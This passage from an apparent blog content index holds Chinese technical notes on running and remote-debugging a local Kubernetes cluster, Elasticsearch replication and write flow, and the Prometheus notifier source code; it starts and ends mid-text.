\\\n        --rkt-stage1-image=\"${RKT_STAGE1_IMAGE}\" \\\n        --hostname-override=\"${HOSTNAME_OVERRIDE}\" \\\n        ${cloud_config_arg} \\\n        --address=\"${KUBELET_HOST}\" \\\n        --kubeconfig \"$CERT_DIR\"/kubelet.kubeconfig \\\n        --feature-gates=\"${FEATURE_GATES}\" \\\n        --cpu-cfs-quota=${CPU_CFS_QUOTA} \\\n        --enable-controller-attach-detach=\"${ENABLE_CONTROLLER_ATTACH_DETACH}\" \\\n        --cgroups-per-qos=${CGROUPS_PER_QOS} \\\n        --cgroup-driver=${CGROUP_DRIVER} \\\n        --keep-terminated-pod-volumes=${KEEP_TERMINATED_POD_VOLUMES} \\\n        --eviction-hard=${EVICTION_HARD} \\\n        --eviction-soft=${EVICTION_SOFT} \\\n        --eviction-pressure-transition-period=${EVICTION_PRESSURE_TRANSITION_PERIOD} \\\n        --pod-manifest-path=\"${POD_MANIFEST_PATH}\" \\\n        --fail-swap-on=\"${FAIL_SWAP_ON}\" \\\n        ${auth_args} \\\n        ${dns_args} \\\n        ${cni_conf_dir_args} \\\n        ${cni_bin_dir_args} \\\n        ${net_plugin_args} \\\n        ${container_runtime_endpoint_args} \\\n        ${image_service_endpoint_args} \\\n        --port=\"$KUBELET_PORT\" \\\n\t${KUBELET_FLAGS} >\"${KUBELET_LOG}\" 2>&1 &\n      KUBELET_PID=$!\n      # Quick check that kubelet is running.\n      if ps -p $KUBELET_PID > /dev/null ; then\n\techo \"kubelet ( $KUBELET_PID ) is running.\"\n      else\n\tcat ${KUBELET_LOG} ; exit 1\n      fi\n    else\n      # Docker won't run a container with a cidfile (container id file)\n      # unless that file does not already exist; clean up an existing\n      # dockerized kubelet that might be running.\n      cleanup_dockerized_kubelet\n      cred_bind=\"\"\n      # path to cloud credentials.\n      cloud_cred=\"\"\n      if [ \"${CLOUD_PROVIDER}\" == \"aws\" ]; then\n          cloud_cred=\"${HOME}/.aws/credentials\"\n      fi\n      if [ \"${CLOUD_PROVIDER}\" == \"gce\" ]; then\n          cloud_cred=\"${HOME}/.config/gcloud\"\n      fi\n      if [ \"${CLOUD_PROVIDER}\" == \"openstack\" ]; then\n          cloud_cred=\"${CLOUD_CONFIG}\"\n      fi\n      if  [[ -n \"${cloud_cred}\" ]]; then\n          cred_bind=\"--volume=${cloud_cred}:${cloud_cred}:ro\"\n      fi\n      docker run \\\n        --volume=/:/rootfs:ro \\\n        --volume=/var/run:/var/run:rw \\\n        --volume=/sys:/sys:ro \\\n        --volume=/var/lib/docker/:/var/lib/docker:ro \\\n        --volume=/var/lib/kubelet/:/var/lib/kubelet:rw \\\n        --volume=/dev:/dev \\\n        --volume=/run/xtables.lock:/run/xtables.lock:rw \\\n        ${cred_bind} \\\n        --net=host \\\n        --privileged=true \\\n        -i \\\n        --cidfile=$KUBELET_CIDFILE \\\n        k8s.gcr.io/kubelet \\\n        /kubelet --v=${LOG_LEVEL} --containerized ${priv_arg}--chaos-chance=\"${CHAOS_CHANCE}\" --pod-manifest-path=\"${POD_MANIFEST_PATH}\" --hostname-override=\"${HOSTNAME_OVERRIDE}\" ${cloud_config_arg} \\ --address=\"127.0.0.1\" --kubeconfig \"$CERT_DIR\"/kubelet.kubeconfig --port=\"$KUBELET_PORT\"  --enable-controller-attach-detach=\"${ENABLE_CONTROLLER_ATTACH_DETACH}\" &> $KUBELET_LOG &\n    fi\n}\nfunction start_kubeproxy {\n    PROXY_LOG=${LOG_DIR}/kube-proxy.log\n    cat <<EOF > /tmp/kube-proxy.yaml\napiVersion: kubeproxy.config.k8s.io/v1alpha1\nkind: KubeProxyConfiguration\nclientConnection:\n  kubeconfig: ${CERT_DIR}/kube-proxy.kubeconfig\nhostnameOverride: ${HOSTNAME_OVERRIDE}\nmode: ${KUBE_PROXY_MODE}\nEOF\n    #sudo \"${GO_OUT}/hyperkube\" proxy \\\n    sudo \"${GO_OUT}/kube-proxy\" \\\n      --v=${LOG_LEVEL} \\\n      --feature-gates=\"${FEATURE_GATES}\" \\\n      --config=/tmp/kube-proxy.yaml \\\n      --master=\"https://${API_HOST}:${API_SECURE_PORT}\" >\"${PROXY_LOG}\" 2>&1 &\n    PROXY_PID=$!\n    SCHEDULER_LOG=${LOG_DIR}/kube-scheduler.log\n    #${CONTROLPLANE_SUDO} \"${GO_OUT}/hyperkube\" scheduler \\\n    ${CONTROLPLANE_SUDO} \"${GO_OUT}/kube-scheduler\" \\\n      --v=${LOG_LEVEL} \\\n      --kubeconfig \"$CERT_DIR\"/scheduler.kubeconfig \\\n      --feature-gates=\"${FEATURE_GATES}\" \\\n      --master=\"https://${API_HOST}:${API_SECURE_PORT}\" >\"${SCHEDULER_LOG}\" 2>&1 &\n    SCHEDULER_PID=$!\n}\nfunction start_kubedns {\n    if [[ \"${ENABLE_CLUSTER_DNS}\" = true ]]; then\n        cp \"${KUBE_ROOT}/cluster/addons/dns/kube-dns.yaml.in\" kube-dns.yaml\n        sed -i -e \"s/{{ pillar\\['dns_domain'\\] }}/${DNS_DOMAIN}/g\" kube-dns.yaml\n        sed -i -e \"s/{{ pillar\\['dns_server'\\] }}/${DNS_SERVER_IP}/g\" kube-dns.yaml\n        # TODO update to dns role once we have one.\n        # use kubectl to create kubedns addon\n        ${KUBECTL} --kubeconfig=\"${CERT_DIR}/admin.kubeconfig\" --namespace=kube-system create -f kube-dns.yaml\n        echo \"Kube-dns addon successfully deployed.\"\n        rm kube-dns.yaml\n    fi\n}\nfunction start_kubedashboard {\n    if [[ \"${ENABLE_CLUSTER_DASHBOARD}\" = true ]]; then\n        echo \"Creating kubernetes-dashboard\"\n        # use kubectl to create the dashboard\n        ${KUBECTL} --kubeconfig=\"${CERT_DIR}/admin.kubeconfig\" apply -f ${KUBE_ROOT}/cluster/addons/dashboard/dashboard-secret.yaml\n        ${KUBECTL} --kubeconfig=\"${CERT_DIR}/admin.kubeconfig\" apply -f ${KUBE_ROOT}/cluster/addons/dashboard/dashboard-configmap.yaml\n        ${KUBECTL} --kubeconfig=\"${CERT_DIR}/admin.kubeconfig\" apply -f ${KUBE_ROOT}/cluster/addons/dashboard/dashboard-rbac.yaml\n        ${KUBECTL} --kubeconfig=\"${CERT_DIR}/admin.kubeconfig\" apply -f ${KUBE_ROOT}/cluster/addons/dashboard/dashboard-controller.yaml\n        ${KUBECTL} --kubeconfig=\"${CERT_DIR}/admin.kubeconfig\" apply -f ${KUBE_ROOT}/cluster/addons/dashboard/dashboard-service.yaml\n        echo \"kubernetes-dashboard deployment and service successfully deployed.\"\n    fi\n}\nfunction create_psp_policy {\n    echo \"Create podsecuritypolicy policies for RBAC.\"\n    ${KUBECTL} --kubeconfig=\"${CERT_DIR}/admin.kubeconfig\" create -f ${KUBE_ROOT}/examples/podsecuritypolicy/rbac/policies.yaml\n    ${KUBECTL} --kubeconfig=\"${CERT_DIR}/admin.kubeconfig\" create -f ${KUBE_ROOT}/examples/podsecuritypolicy/rbac/roles.yaml\n    ${KUBECTL} --kubeconfig=\"${CERT_DIR}/admin.kubeconfig\" create -f ${KUBE_ROOT}/examples/podsecuritypolicy/rbac/bindings.yaml\n}\nfunction create_storage_class {\n    if [ -z \"$CLOUD_PROVIDER\" ]; then\n        CLASS_FILE=${KUBE_ROOT}/cluster/addons/storage-class/local/default.yaml\n    else\n        CLASS_FILE=${KUBE_ROOT}/cluster/addons/storage-class/${CLOUD_PROVIDER}/default.yaml\n    fi\n    if [ -e $CLASS_FILE ]; then\n        echo \"Create default storage class for $CLOUD_PROVIDER\"\n        ${KUBECTL} --kubeconfig=\"${CERT_DIR}/admin.kubeconfig\" create -f $CLASS_FILE\n    else\n        echo \"No storage class available for $CLOUD_PROVIDER.\"\n    fi\n}\nfunction print_success {\nif [[ \"${START_MODE}\" != \"kubeletonly\" ]]; then\n  if [[ \"${ENABLE_DAEMON}\" = false ]]; then\n    echo \"Local Kubernetes cluster is running. Press Ctrl-C to shut it down.\"\n  else\n    echo \"Local Kubernetes cluster is running.\"\n  fi\n  cat <<EOF\nLogs:\n  ${APISERVER_LOG:-}\n  ${CTLRMGR_LOG:-}\n  ${CLOUD_CTLRMGR_LOG:-}\n  ${PROXY_LOG:-}\n  ${SCHEDULER_LOG:-}\nEOF\nfi\nif [[ \"${ENABLE_APISERVER_BASIC_AUDIT:-}\" = true ]]; then\n  echo \"  ${APISERVER_BASIC_AUDIT_LOG}\"\nfi\nif [[ \"${START_MODE}\" == \"all\" ]]; then\n  echo \"  ${KUBELET_LOG}\"\nelif [[ \"${START_MODE}\" == \"nokubelet\" ]]; then\n  echo\n  echo \"No kubelet was started because you set START_MODE=nokubelet\"\n  echo \"Run this script again with START_MODE=kubeletonly to run a kubelet\"\nfi\nif [[ \"${START_MODE}\" != \"kubeletonly\" ]]; then\n  echo\n  if [[ \"${ENABLE_DAEMON}\" = false ]]; then\n    echo \"To start using your cluster, you can open up another terminal/tab and run:\"\n  else\n    echo \"To start using your cluster, run:\"\n  fi\n  cat <<EOF\n  export KUBECONFIG=${CERT_DIR}/admin.kubeconfig\n  cluster/kubectl.sh\nAlternatively, you can write to the default kubeconfig:\n  export KUBERNETES_PROVIDER=local\n  cluster/kubectl.sh config set-cluster local --server=https://${API_HOST}:${API_SECURE_PORT} --certificate-authority=${ROOT_CA_FILE}\n  cluster/kubectl.sh config set-credentials myself ${AUTH_ARGS}\n  cluster/kubectl.sh config set-context local --cluster=local --user=myself\n  cluster/kubectl.sh config use-context local\n  cluster/kubectl.sh\nEOF\nelse\n  cat <<EOF\nThe kubelet was started.\nLogs:\n  ${KUBELET_LOG}\nEOF\nfi\n}\n# If we are running in the CI, we need a few more things before we can start\nif [[ \"${KUBETEST_IN_DOCKER:-}\" == \"true\" ]]; then\n  echo \"Preparing to test ...\"\n  ${KUBE_ROOT}/hack/install-etcd.sh\n  export PATH=\"${KUBE_ROOT}/third_party/etcd:${PATH}\"\n  KUBE_FASTBUILD=true make ginkgo cross\n  apt install -y sudo\nfi\n# validate that etcd is: not running, in path, and has minimum required version.\nif [[ \"${START_MODE}\" != \"kubeletonly\" ]]; then\n  kube::etcd::validate\nfi\nif [ \"${CONTAINER_RUNTIME}\" == \"docker\" ] && ! kube::util::ensure_docker_daemon_connectivity; then\n  exit 1\nfi\nif [[ \"${CONTAINER_RUNTIME}\" == \"rkt\" ]]; then\n  test_rkt\nfi\nif [[ \"${START_MODE}\" != \"kubeletonly\" ]]; then\n  test_apiserver_off\nfi\nkube::util::test_openssl_installed\nkube::util::ensure-cfssl\n### IF the user didn't supply an output/ for the build... Then we detect.\nif [ \"$GO_OUT\" == \"\" ]; then\n  detect_binary\nfi\necho \"Detected host and ready to start services.  Doing some housekeeping first...\"\necho \"Using GO_OUT $GO_OUT\"\nKUBELET_CIDFILE=/tmp/kubelet.cid\nif [[ \"${ENABLE_DAEMON}\" = false ]]; then\n  trap cleanup EXIT\nfi\necho \"Starting services now!\"\nif [[ \"${START_MODE}\" != \"kubeletonly\" ]]; then\n  start_etcd\n  set_service_accounts\n  start_apiserver\n  start_controller_manager\n  if [[ \"${EXTERNAL_CLOUD_PROVIDER:-}\" == \"true\" ]]; then\n    start_cloud_controller_manager\n  fi\n  start_kubeproxy\n  start_kubedns\n  start_kubedashboard\nfi\nif [[ \"${START_MODE}\" != \"nokubelet\" ]]; then\n  ## TODO remove this check if/when kubelet is supported on darwin\n  # Detect the OS name/arch and display appropriate error.\n    case \"$(uname -s)\" in\n      Darwin)\n        warning \"kubelet is not currently supported in darwin, kubelet aborted.\"\n        KUBELET_LOG=\"\"\n        ;;\n      Linux)\n        start_kubelet\n        ;;\n      *)\n        warning \"Unsupported host OS.  Must be Linux or Mac OS X, kubelet aborted.\"\n        ;;\n    esac\nfi\nif [[ -n \"${PSP_ADMISSION}\" && \"${AUTHORIZATION_MODE}\" = *RBAC* ]]; then\n  create_psp_policy\nfi\nif [[ \"$DEFAULT_STORAGE_CLASS\" = \"true\" ]]; then\n  create_storage_class\nfi\nprint_success\nif [[ \"${ENABLE_DAEMON}\" = false ]]; then\n  while true; do sleep 1; done\nfi\nif [[ \"${KUBETEST_IN_DOCKER:-}\" == \"true\" ]]; then\n  cluster/kubectl.sh config set-cluster local --server=https://localhost:6443 --certificate-authority=/var/run/kubernetes/server-ca.crt\n  cluster/kubectl.sh config set-credentials myself --client-key=/var/run/kubernetes/client-admin.key --client-certificate=/var/run/kubernetes/client-admin.crt\n  cluster/kubectl.sh config set-context local --cluster=local --user=myself\n  cluster/kubectl.sh config use-context local\nfi\n\n\n```\n\n执行过程中如果有kubelet启动失败的问题；\n\n```shell\nfailed to run Kubelet: failed to create kubelet: misconfiguration: kubelet c\n```\n\n解决方案:\n\n```shell\n[root@server02 ~]# docker info\n...\nServer Version: 1.13.1\nStorage Driver: overlay2\n Backing Filesystem: xfs\n Supports d_type: true\n Native Overlay Diff: true\nLogging Driver: journald\nCgroup Driver: systemd\n...\n```\n\n```shell\n# 修改docker.service\nvi /lib/systemd/system/docker.service\n\n找到\n--exec-opt native.cgroupdriver=systemd \\\n修改为：\n--exec-opt native.cgroupdriver=cgroupfs \\\n\n# 重启docker\nsystemctl daemon-reload\nsystemctl restart docker\n\n# 修改后查看docker Cgroup Driver\n[root@server03 sysconfig]# docker info\n...\nServer Version: 1.13.1\nStorage Driver: overlay2\n Backing Filesystem: xfs\n Supports d_type: true\n Native Overlay Diff: true\nLogging Driver: journald\nCgroup Driver: cgroupfs\n...\n```\n\n继续：\n\n单机集群：\n\n```shell\n#第一次执行下面的命令编译并启动集群\n./hack/local-up-cluster.sh\n```\n\n```shell\nmake GOGCFLAGS=\"-N -l\" WHAT=\"cmd/kube-apiserver\" # 假设只编译kube-apiserver这一个模块，需要单独编译，这个命令不管用，不考虑了吧~~\n```\n\n直接执行跳过编译：\n\n```shell\n./hack/local-up-cluster.sh -O\n```\n\n\n\n检查kube启动正常\n\n```shell\nps -ef|grep kube|grep -v grep\n```\n\n以apiserver为例子\n\n```shell\nkill -15 5228\ndlv --listen=:2345 --headless=true --api-version=2 --accept-multiclient exec /root/gopath/src/k8s.io/kubernetes/_output/bin/kube-apiserver -- --authorization-mode=Node,RBAC --runtime-config=settings.k8s.io/v1alpha1 --cloud-provider= --cloud-config= --v=3 --vmodule= --cert-dir=/var/run/kubernetes --client-ca-file=/var/run/kubernetes/client-ca.crt --service-account-key-file=/tmp/kube-serviceaccount.key --service-account-lookup=true --enable-admission-plugins=LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota,PodPreset,StorageObjectInUseProtection --disable-admission-plugins= --admission-control-config-file= --bind-address=0.0.0.0 --secure-port=6443 --tls-cert-file=/var/run/kubernetes/serving-kube-apiserver.crt --tls-private-key-file=/var/run/kubernetes/serving-kube-apiserver.key --insecure-bind-address=127.0.0.1 --insecure-port=8080 --storage-backend=etcd3 --etcd-servers=http://127.0.0.1:2379 --service-cluster-ip-range=10.0.0.0/24 --feature-gates=AllAlpha=false --external-hostname=localhost --requestheader-username-headers=X-Remote-User --requestheader-group-headers=X-Remote-Group --requestheader-extra-headers-prefix=X-Remote-Extra- --requestheader-client-ca-file=/var/run/kubernetes/request-header-ca.crt --requestheader-allowed-names=system:auth-proxy --proxy-client-cert-file=/var/run/kubernetes/client-auth-proxy.crt --proxy-client-key-file=/var/run/kubernetes/client-auth-proxy.key --cors-allowed-origins='/127.0.0.1(:[0-9]+)?$,/localhost(:[0-9]+)?$'\n```\n\n执行apiserver\n\n远程端口：39999\n\n 防火墙放开：\n\n```shell\nfirewall-cmd --zone=public --add-port=39999/tcp --permanent\nfirewall-cmd --reload\n```\n\n远程调试坑：\n\n如果要调试如kube-apiserver程序则需要重新编译增加编译参数\n\n```shell\ngo build -o _output/bin/kube-apiserver -gcflags=\"-N -l\" cmd/kube-apiserver/apiserver.go\n```\n\n否则无法监听\n\n```go\nexport GO_OUT=/go/src/k8s.io/kubernetes/_output/bin\n```\n\n\n\ngoland配置：\n\nRun->edit configuration配置。\n\n![1567673734423](C:\\Users\\xudong\\AppData\\Roaming\\Typora\\typora-user-images\\1567673734423.png)\n\n断点调试。\n\n这样远程同步完代码就可以远程调试了。\n\n开始源码分析之路~~。\n\n\n\n","tags":["k8s"],"categories":["k8s"]},{"title":"ES过程分析","url":"/2020/02/26/es过程分析/","content":"\n## ES过程分析\n\n### 选主算法\n\nBully算法\n\n他假设所有节点都有一个唯一的ID，使用该ID对节点进行排序。任何时候的当前Leader都是集群的最高ID节点。ES通过推迟选举，知道当前的Master失效来解决这个问题，只要当前节点不挂掉，就不重新选主。但容易出现脑裂，为此，再通过得票人数过半来解决脑裂问题。\n\nPaxos算法\n\n### 数据副本策略\n\n分片副本采用主从模式。多副本中存在一个主副本Primary和多个从副本Secondary。所有写入操作都写入到主副本，当主副本出错的时候，系统从其他的从副本中选择合适的副本作为新的副本。\n\n数据写入流程：\n\n1）写请求进入主副本节点，节点为该操作分配SN，使用该SN创建UpdateRequest结构。然后将该UpdateRequest插入自己的PrepareList\n\n2）主副本节点将携带SN的UpdateRequest发往从副本节点，从节点收到后同样插入PrepareList，完成后给主副本节点回复一个ACK\n\n3）一旦主副本节点收到所有从副本节点的相应，确定该数据已经被正确写入到所有的从副本节点，此时认为可以提交了，将此UpdateRequest放入到commited list， commited list向前移动。\n\n4）主副本节点回复客户端更新成功完成。对每个prepare消息，主副本节点向从副本节点发送一个commit通知，告诉他们自己的commited point位置，从副本节点收到通知后根据指示移动commited point到相同的位置。\n\n### 基本读取模型\n\n1）读请求转发到相关分片。注意，因为大多数搜索都会发送到一个或者多个索引，通常需要从多个分片中读取。每个分片都保存这些数据的一部分。\n\n2）从副本组中选择一个相关分片的活跃副本，它可以是主分片或副分片。默认情况下，ES会简单地循环遍历这些分片\n\n3）发送分片级的读请求到被选中的副本\n\n4）合并结果并给客户端返回响应，注意，针对通过ID查找的get请求，会跳过这个步骤，因为只有一个相关的分片。\n\n### Index基本流程\n\n新建，索引和删除请求都是写操作。写操作必须先在主分片执行成功后才能复制到相关的副分片。写单个文档的流程。\n\n1）客户端向NODE1发送写请求\n\n2）NODE1使用文档ID来确定文档属于分片0，通过集群状态中的内容路由表信息来获知分片0的主分片位于NODE3，因此请求被转发到NODE3上\n\n3）NODE3上的主分片执行写操作，如果写入成功，则它将请求并行转发到NODE1和NODE2的副分片上，等待返回结果。当所有的副分片都报告成功，NODE3将向协调节点报告成功，协调节点再想客户端报告成功。\n\nquorum = int( (primary+number_of_replicas)/2)+1\n\n### 协调节点流程\n\n协调节点负责创建索引，转发请求到主分片节点，等待响应，回复客户端。\n\n1）参数检查\n\n2）处理pipeline请求\n\n3）自动创建索引\n\n4）对请求的预先处理\n\n5）检测集群状态\n\n6）内容路由，构建基于shared的请求\n\n7）路由算法\n\n8）转发请求并等待响应\n\n### 主分片节点流程\n\n主节点所在节点负责在本地写主分片，写成功后，转发写副分片请求，等待响应，回复协调节点。\n\n1）检查请求\n\n2）是否延迟执行\n\n3）判断主分片是否已经发生迁移\n\n4）检查写一致性\n\n5）写Lucene和事务日志\n\n6）flush translog\n\n7）写副分片\n\n8）处理副分片写失败情况\n\n\n\n\n\n\n\n\n\n","tags":["ElasticSearch"],"categories":["ElasticSearch"]},{"title":"Prometheus 架构和源码学习","url":"/2020/02/18/prometheus原理介绍/","content":"\n\n# Prometheus 架构和源码\n\n## Prometheus架构\n\n![architecture.png](http://www.aneasystone.com/usr/uploads/2018/10/4197609471.png)\n\n##  构成部分\n\nprometheus源码分析（prometheus基于版本2.1.0和alertmanager版本0.8.0）：\n\n1. notifier\n2. ruleManager\n3. queryengine\n4. web\n5. discovermanager\n6. scrapeManager\n7. localstorage/remotestorage\n8. alertManager\n9. pushgateway\n\n各个组件的构成结构图：\n\n![1572413613743](/images/1572413613743.png)\n\n\n\n## Notifier\n\nnotifier 组件用于告警通知，在完成初始化后，notifier组件内部会构建一个告警通知队列，队列的大小由命令行参数--alertmanager.notification-queue-capacity确定，默认值为10000 ，且告警信息通过sendAlerts方法发送给AlertManager 。\n\n初始化notifier组件：\n\n```go\nnotifier               = notifier.New(&cfg.notifier, log.With(logger, \"component\", \"notifier\"))\n```\n\nnotifier将规则触发的告警信息AlertManagers服务组的过程，通知管理服务由发现AlertManager服务，注册notifier和notifier服务组成。\n\n发现alertManager服务（discoveryManagerScrape）的逻辑与发现scrape服务（discoveryManagerNotify）的逻辑是一样的，\n\n如果将alertmanager组件结合，那么服务发现的类型就是static_configs\n\n初始化的过程中会完成对rulemanager和notifier组件的构造，同时notifier会通过sendAlerts向ruleManager回调注册。\n\n启动notifier服务：\n\n1.构建notifier结构实列\n\n2.加载系统配置\n\n3.启动notifier\n\nnotifier服务结构：\n\n```go\n// Notifier is responsible for dispatching alert notifications to an\n// alert manager service.\ntype Notifier struct {\n\tqueue []*Alert\n\topts  *Options\n\n\tmetrics *alertMetrics\n\n\tmore   chan struct{}\n\tmtx    sync.RWMutex\n\tctx    context.Context\n\tcancel func()\n\n\talertmanagers map[string]*alertmanagerSet\n\tlogger        log.Logger\n}\n```\n\nnotifier实列使用New方法来实现，处理逻辑：\n\n1. QueueCapacity的大小构建告警信息缓存队列，QueueCapacity的大小使用命令行启动参数--alertmanager.notification-queue-capacity指定\n2. context协同控制notifier服务\n3. 注册notifier服务指标：告警缓存队列大小，告警信息长度，告警地址个书，丢弃的告警信息个数\n\n```go\n// New constructs a new Notifier.\nfunc New(o *Options, logger log.Logger) *Notifier {\n\tctx, cancel := context.WithCancel(context.Background())\n\n\tif o.Do == nil {\n\t\to.Do = ctxhttp.Do\n\t}\n\tif logger == nil {\n\t\tlogger = log.NewNopLogger()\n\t}\n\n\tn := &Notifier{\n\t\tqueue:  make([]*Alert, 0, o.QueueCapacity),\n\t\tctx:    ctx,\n\t\tcancel: cancel,\n\t\tmore:   make(chan struct{}, 1),\n\t\topts:   o,\n\t\tlogger: logger,\n\t}\n\n\tqueueLenFunc := func() float64 { return float64(n.queueLen()) }\n\talertmanagersDiscoveredFunc := func() float64 { return float64(len(n.Alertmanagers())) }\n\n\tn.metrics = newAlertMetrics(\n\t\to.Registerer,\n\t\to.QueueCapacity,\n\t\tqueueLenFunc,\n\t\talertmanagersDiscoveredFunc,\n\t)\n\n\treturn n\n}\n```\n\nnewAlertMetrics是将notifier服务指标注册到prometheus系统的具体实现：\n\n```go\nfunc newAlertMetrics(r prometheus.Registerer, queueCap int, queueLen, alertmanagersDiscovered func() float64) *alertMetrics {\n\tm := &alertMetrics{\n\t\tlatency: prometheus.NewSummaryVec(prometheus.SummaryOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"latency_seconds\",\n\t\t\tHelp:      \"Latency quantiles for sending alert notifications (not including dropped notifications).\",\n\t\t},\n\t\t\t[]string{alertmanagerLabel},\n\t\t),\n\t\terrors: prometheus.NewCounterVec(prometheus.CounterOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"errors_total\",\n\t\t\tHelp:      \"Total number of errors sending alert notifications.\",\n\t\t},\n\t\t\t[]string{alertmanagerLabel},\n\t\t),\n\t\tsent: prometheus.NewCounterVec(prometheus.CounterOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"sent_total\",\n\t\t\tHelp:      \"Total number of alerts successfully sent.\",\n\t\t},\n\t\t\t[]string{alertmanagerLabel},\n\t\t),\n\t\tdropped: prometheus.NewCounter(prometheus.CounterOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"dropped_total\",\n\t\t\tHelp:      \"Total number of alerts dropped due to errors when sending to Alertmanager.\",\n\t\t}),\n\t\tqueueLength: prometheus.NewGaugeFunc(prometheus.GaugeOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"queue_length\",\n\t\t\tHelp:      \"The number of alert notifications in the queue.\",\n\t\t}, queueLen),\n\t\tqueueCapacity: prometheus.NewGauge(prometheus.GaugeOpts{\n\t\t\tNamespace: namespace,\n\t\t\tSubsystem: subsystem,\n\t\t\tName:      \"queue_capacity\",\n\t\t\tHelp:      \"The capacity of the alert notifications queue.\",\n\t\t}),\n\t\talertmanagersDiscovered: prometheus.NewGaugeFunc(prometheus.GaugeOpts{\n\t\t\tName: \"prometheus_notifications_alertmanagers_discovered\",\n\t\t\tHelp: \"The number of alertmanagers discovered and active.\",\n\t\t}, alertmanagersDiscovered),\n\t}\n\n\tm.queueCapacity.Set(float64(queueCap))\n\n\tif r != nil {\n\t\tr.MustRegister(\n\t\t\tm.latency,\n\t\t\tm.errors,\n\t\t\tm.sent,\n\t\t\tm.dropped,\n\t\t\tm.queueLength,\n\t\t\tm.queueCapacity,\n\t\t\tm.alertmanagersDiscovered,\n\t\t)\n\t}\n\n\treturn m\n}\n```\n\n加载服务配置：\n\n加载系统的配置过程，notifier服务会从prometheus.yml中获取external_labels, alert_relabel_configs和告警服务配置信息，将其保存到alertmanager中，告警触发的时候，根据external_labels,alert_relabel_configs的规则添加，重置对应的label，更具告警服务信息完成告警的信息发送。\n\n```go\n\n// ApplyConfig updates the status state as the new config requires.\nfunc (n *Notifier) ApplyConfig(conf *config.Config) error {\n\tn.mtx.Lock()\n\tdefer n.mtx.Unlock()\n\n\tn.opts.ExternalLabels = conf.GlobalConfig.ExternalLabels\n\tn.opts.RelabelConfigs = conf.AlertingConfig.AlertRelabelConfigs\n\n\tamSets := make(map[string]*alertmanagerSet)\n\n\tfor _, cfg := range conf.AlertingConfig.AlertmanagerConfigs {\n\t\tams, err := newAlertmanagerSet(cfg, n.logger)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\tams.metrics = n.metrics\n\n\t\t// The config hash is used for the map lookup identifier.\n\t\tb, err := json.Marshal(cfg)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tamSets[fmt.Sprintf(\"%x\", md5.Sum(b))] = ams\n\t}\n\n\tn.alertmanagers = amSets\n\n\treturn nil\n}\n```\n\nnewAlertmanagerSet方法会根据告警服务的配置信息构建alertmanagerSet结构实列，告警服务对应的ams还是初始化空列表\n\n```go\n// alertmanagerSet contains a set of Alertmanagers discovered via a group of service\n// discovery definitions that have a common configuration on how alerts should be sent.\ntype alertmanagerSet struct {\n\tcfg    *config.AlertmanagerConfig\n\tclient *http.Client\n\n\tmetrics *alertMetrics\n\n\tmtx    sync.RWMutex\n\tams    []alertmanager\n\tlogger log.Logger\n}\n```\n\n初始化函数：\n\n```go\nfunc newAlertmanagerSet(cfg *config.AlertmanagerConfig, logger log.Logger) (*alertmanagerSet, error) {\n\tclient, err := httputil.NewClientFromConfig(cfg.HTTPClientConfig, \"alertmanager\")\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\ts := &alertmanagerSet{\n\t\tclient: client,\n\t\tcfg:    cfg,\n\t\tlogger: logger,\n\t}\n\treturn s, nil\n}\n```\n\n启动notifier服务：\n\n```go\n// Run dispatches notifications continuously.\nfunc (n *Notifier) Run(tsets <-chan map[string][]*targetgroup.Group) {\n\n\tfor {\n\t\tselect {\n\t\tcase <-n.ctx.Done():\n\t\t\treturn\n\t\tcase ts := <-tsets:\n\t\t\tn.reload(ts)\n\t\tcase <-n.more:\n\t\t}\n\t\talerts := n.nextBatch()\n\n\t\tif !n.sendAll(alerts...) {\n\t\t\tn.metrics.dropped.Add(float64(len(alerts)))\n\t\t}\n\t\t// If the queue still has items left, kick off the next iteration.\n\t\tif n.queueLen() > 0 {\n\t\t\tn.setMore()\n\t\t}\n\t}\n}\n```\n\n服务收到更新信号调用reload方法，将告警服务ts放入reload方法中，更新服务目标服务信息。\n\nscrape发现服务以job_name为单元，notifier发现服务以告警服务为单元，告警服务作用域所有的job_name.\n\n```go\nfunc (n *Notifier) reload(tgs map[string][]*targetgroup.Group) {\n\tn.mtx.Lock()\n\tdefer n.mtx.Unlock()\n\n\tfor id, tgroup := range tgs {\n\t\tam, ok := n.alertmanagers[id]\n\t\tif !ok {\n\t\t\tlevel.Error(n.logger).Log(\"msg\", \"couldn't sync alert manager set\", \"err\", fmt.Sprintf(\"invalid id:%v\", id))\n\t\t\tcontinue\n\t\t}\n\t\tam.sync(tgroup)\n\t}\n}\n```\n\n调用sync方法，同步告警服务信息\n\n```go\n// sync extracts a deduplicated set of Alertmanager endpoints from a list\n// of target groups definitions.\nfunc (s *alertmanagerSet) sync(tgs []*targetgroup.Group) {\n\tall := []alertmanager{}\n\n\tfor _, tg := range tgs {\n\t\tams, err := alertmanagerFromGroup(tg, s.cfg)\n\t\tif err != nil {\n\t\t\tlevel.Error(s.logger).Log(\"msg\", \"Creating discovered Alertmanagers failed\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tall = append(all, ams...)\n\t}\n\n\ts.mtx.Lock()\n\tdefer s.mtx.Unlock()\n\t// Set new Alertmanagers and deduplicate them along their unique URL.\n\ts.ams = []alertmanager{}\n\tseen := map[string]struct{}{}\n\n\tfor _, am := range all {\n\t\tus := am.url().String()\n\t\tif _, ok := seen[us]; ok {\n\t\t\tcontinue\n\t\t}\n\n\t\t// This will initialise the Counters for the AM to 0.\n\t\ts.metrics.sent.WithLabelValues(us)\n\t\ts.metrics.errors.WithLabelValues(us)\n\t\t//根据URL地址构建唯一键值，\n\t\tseen[us] = struct{}{}\n        //保存alertmanager\n\t\ts.ams = append(s.ams, am)\n\t}\n}\n```\n\nalertmanagerFromGroup 方法中将对告警信息的label 进行整理，包括__address__, __alerts_path__ 和 